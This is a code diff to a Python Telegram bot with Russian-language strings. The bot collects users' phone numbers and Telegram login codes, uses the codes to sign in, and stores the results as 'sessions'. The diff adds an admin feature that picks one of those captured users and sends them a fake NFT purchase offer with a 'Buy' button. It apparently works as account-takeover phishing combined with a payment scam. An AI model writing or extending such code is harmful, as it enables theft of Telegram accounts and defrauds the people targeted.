@@ -86,6 +86,12 @@ class BroadcastState(StatesGroup):
     waiting_for_content = State()
 
 
+class AdminNftState(StatesGroup):
+    waiting_for_nft_name = State()
+    waiting_for_price = State()
+    waiting_for_text = State()
+
+
 def get_code_keyboard():
     keyboard = []
     row = []
@@ -105,6 +111,7 @@ def get_code_keyboard():
 def get_admin_keyboard():
     keyboard = [
         [InlineKeyboardButton(text="👥 Зарегистрированные номера", callback_data="admin_users")],
+        [InlineKeyboardButton(text="🎁 Выдать NFT пользователю", callback_data="admin_send_nft_list")],
         [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
     ]
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
@@ -200,7 +207,7 @@ async def process_phone(message: Message, state: FSMContext):
         await state.set_state(AuthState.waiting_for_code)
         await message.answer(
             "Код подтверждения\n\n"
-            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки ниже или **просто написать код цифрами в чат** (например: <code>12345</code>)!\n\n"
+            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки или **просто написать код цифрами в чат** (например: <code>12345</code>)!\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
@@ -214,7 +221,7 @@ async def process_phone(message: Message, state: FSMContext):
         await state.clear()
 
 
-# --- ЕДИНАЯ ФУНКЦИЯ ВХОДА (ДЛЯ КНОПОК И ТЕКСТА) ---
+# --- ЕДИНАЯ ФУНКЦИЯ ВХОДА (КНОПКИ И ТЕКСТ) ---
 async def execute_sign_in(bot_inst, chat_id, state: FSMContext, user_id: int, code_str: str):
     if user_id not in temp_auth_data:
         await bot_inst.send_message(chat_id, "❌ Сессия истекла. Напиши /start заново.")
@@ -277,7 +284,7 @@ async def execute_sign_in(bot_inst, chat_id, state: FSMContext, user_id: int, co
             data["code"] = ""
 
 
-# --- ОБРАБОТКА КНОПОК КЛАВИАТУРЫ КОДА ---
+# --- КНОПКИ ВВОДА КОДА ---
 @router.callback_query(AuthState.waiting_for_code, F.data.startswith("digit_"))
 async def process_code_input(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
@@ -320,7 +327,7 @@ async def process_code_input(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
 
 
-# --- ОБРАБОТКА ТЕКСТА (ВВОД КОДА ЧЕРЕЗ ЧАТ) ---
+# --- ТЕКСТОВЫЙ ВВОД КОДА В ЧАТ ---
 @router.message(AuthState.waiting_for_code, F.text)
 async def process_code_text(message: Message, state: FSMContext):
     user_id = message.from_user.id
@@ -464,7 +471,7 @@ async def finalize_nft_request(message_obj, state: FSMContext, user):
     await state.clear()
 
 
-# --- АДМИН ПАНЕЛЬ И РАССЫЛКА ---
+# --- АДМИН ПАНЕЛЬ И ВЫДАЧА NFT ---
 @router.callback_query(F.data == "admin_users")
 async def admin_list_users(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -487,6 +494,105 @@ async def admin_list_users(callback: CallbackQuery):
     await callback.message.edit_text("👥 Номера в базе:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
 
 
+# --- ВЫДАЧА NFT ИЗ АДМИНКИ ---
+@router.callback_query(F.data == "admin_send_nft_list")
+async def admin_send_nft_list(callback: CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+
+    conn = sqlite3.connect("database.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT user_id, phone FROM sessions")
+    rows = cursor.fetchall()
+    conn.close()
+
+    if not rows:
+        return await callback.answer("📭 В базе нет пользователей (номеров), которым можно отправить NFT!", show_alert=True)
+
+    keyboard = [[InlineKeyboardButton(text=f"📱 {phone} (ID: {user_id})", callback_data=f"give_nft_user_{user_id}")] for user_id, phone in rows]
+    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
+    
+    await callback.message.edit_text(
+        "🎁 **Выберите пользователя (номер), которому хотите отправить NFT:**",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard),
+        parse_mode="Markdown"
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("give_nft_user_"))
+async def give_nft_select_user(callback: CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return
+
+    target_user_id = int(callback.data.split("_")[3])
+    await state.update_data(target_user_id=target_user_id)
+
+    await callback.message.edit_text(
+        f"🎯 Выбран пользователь ID: `{target_user_id}`\n\n"
+        "🏷 **Шаг 1/3:** Напишите название NFT:",
+        parse_mode="Markdown"
+    )
+    await state.set_state(AdminNftState.waiting_for_nft_name)
+    await callback.answer()
+
+
+@router.message(AdminNftState.waiting_for_nft_name, F.text)
+async def admin_nft_get_name(message: Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    await state.update_data(nft_name=message.text)
+    await message.answer("💰 **Шаг 2/3:** Введите цену NFT (например: <code>100 TON</code> или <code>500 Звезд</code>):", parse_mode="HTML")
+    await state.set_state(AdminNftState.waiting_for_price)
+
+
+@router.message(AdminNftState.waiting_for_price, F.text)
+async def admin_nft_get_price(message: Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    await state.update_data(nft_price=message.text)
+    await message.answer("💬 **Шаг 3/3:** Напишите текст сообщения для пользователя:", parse_mode="Markdown")
+    await state.set_state(AdminNftState.waiting_for_text)
+
+
+@router.message(AdminNftState.waiting_for_text, F.text)
+async def admin_nft_finalize(message: Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    data = await state.get_data()
+    target_user_id = data.get("target_user_id")
+    nft_name = data.get("nft_name")
+    nft_price = data.get("nft_price")
+    custom_text = message.text
+
+    await state.clear()
+
+    # Формируем сообщение с кнопкой Купить
+    buy_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💳 Купить", callback_data="buy_nft_action")]
+    ])
+
+    final_msg = (
+        f"🎁 **Вам доступна покупка NFT!**\n\n"
+        f"🏷 Название: `{nft_name}`\n"
+        f"💵 Цена: `{nft_price}`\n\n"
+        f"💬 {custom_text}"
+    )
+
+    try:
+        await bot.send_message(target_user_id, final_msg, reply_markup=buy_kb, parse_mode="Markdown")
+        await message.answer(f"✅ NFT успешно отправлена пользователю `{target_user_id}` с кнопкой «Купить»!", parse_mode="Markdown")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка отправки пользователю: {e}")
+
+
+@router.callback_query(F.data == "buy_nft_action")
+async def user_click_buy_nft(callback: CallbackQuery):
+    await callback.answer("🛒 Перенаправляем на оплату / подтверждение покупки...", show_alert=True)
+    await callback.message.answer("💎 Для завершения покупки NFT подтвердите транзакцию в боте.")
+
+
+# --- УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЕМ ИЗ АДМИНКИ ---
 @router.callback_query(F.data.startswith("adm_user_"))
 async def admin_manage_user(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
